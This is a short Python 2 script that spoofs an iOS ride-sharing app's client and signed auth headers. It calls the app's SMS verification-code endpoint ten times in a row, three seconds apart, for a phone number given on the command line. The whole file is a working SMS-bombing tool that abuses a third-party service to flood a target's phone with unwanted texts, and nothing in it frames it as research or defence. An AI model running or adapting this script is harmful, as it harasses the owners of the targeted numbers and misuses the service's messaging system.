#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150326


import json
import random
import requests
import time
import sys


def sms_send(phone):
    pload = {'mobile':phone}
    headers = {'Pragma':'no-cache',
               'User-Agent':'TTYC/1.4.8 CFNetwork/672.0.8 Darwin/14.0.0',
               'clientinfo':'{"cityid":131,"net":"wifi","loc":"30.625547,104.097005,65","dt":"2015-03-26 14:39:46","tz":28800, "appnm":"ttyc","appVer":"1.4.8","clientType":"ios", "model":"iPhone", "os":"iPhone OS7.1.4", "screen":"320x568", "channel":"app_store","did":"3206DCE4-6051-482D-86D3-4F6130B60000","token":""}',
                'clientauth':'{"sign":"096b43ec96fb46959cce103556290c01","rd":"AE1154120139447C8F467C6CB8E4B9D3-713675902","code":"4acc85390db36846ab4ba7e011367a9d02c38183418343c06eb8da6c9e29736a"}',
        }
    api_url = 'http://api.ttyongche.com/api/v1/mobile/get_mobile_code'
    try:
        req = requests.get(api_url,headers=headers,params = pload,timeout=3)
    except requests.RequestException as e:
        print "error info:" % e
    try:
        success = json.loads(req.content)['success']
        print 'sms send result is:%s' % success
    except:
        print '[-] send False'




if __name__ == '__main__':
    args = []
    if len(sys.argv) != 2:
        print "usage: %s phone" % sys.argv[0]
        sys.exit(1)
    phone = sys.argv[1]
    for i in range(10):
        time.sleep(3)
        sms_send(phone)
